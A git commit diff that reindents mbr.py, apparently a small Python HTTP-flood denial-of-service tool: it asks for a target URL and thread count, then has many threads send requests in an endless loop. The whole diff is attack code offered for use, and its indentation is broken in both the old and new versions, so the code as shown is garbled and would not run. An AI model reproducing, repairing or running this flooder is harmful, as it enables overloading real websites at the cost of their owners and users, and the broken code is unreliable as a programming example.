3b568c8ecbd301780d9dfe43a9bb1bf515f00034
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-07-30 13:01:42 +0300

    Update mbr.py

--- mbr.py
+++ mbr.py
@@ -22,29 +22,25 @@ os.system("clear")
 print( '''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')
 
 def dos(target):
-while True:
-   try:
-      res = requests.get(target)
-      print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
-   except requests.exceptions.ConnectionError:
-      print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")
-threads = 120
-url = input("URL: ")
-   try:
+    while True:
+        try:
+           res = requests.get(target)
+           print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
+    except requests.exceptions.ConnectionError:
+           print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")
+     threads = 120
+           url = input("URL: ")
+       try:
      threads = int(input("Threads: "))
-except ValueError:
-  exit("Threads count is incorrect!")
+    except ValueError:
+     exit("Threads count is incorrect!")
 
-if threads == 0:
-
-  exit("Threads count is incorrect!")
-
+    if threads == 0:
+     exit("Threads count is incorrect!")
 if not url.__contains__("http"):
-
- exit("URL doesnt contains http or https!")
-
+     exit("URL doesnt contains http or https!")
 if not url.__contains__("."):
-exit("Invalid domain")
+     exit("Invalid domain")
 for i in range(0, threads):
 thr = threading.Thread(target=dos, args=(url,))
 thr.start()
